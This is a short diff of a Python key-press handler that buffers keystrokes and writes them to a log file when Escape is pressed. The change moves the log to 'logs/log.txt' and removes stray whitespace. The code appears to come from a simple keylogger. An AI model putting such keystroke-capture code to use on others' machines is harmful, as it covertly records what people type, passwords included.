@@ -35,7 +35,7 @@ def on_press(key):
 		newKeys = ""
 
 	elif (str(key) == "Key.esc"):
-		with open('log.txt', 'a') as f:
+		with open('logs/log.txt', 'a') as f:
 			for ele in log:
 				f.write(ele + '\n')
 		log = [];
@@ -45,7 +45,7 @@ def on_press(key):
 
 
 # with open('filename.txt','a') as f:
-	
+
 
 
 
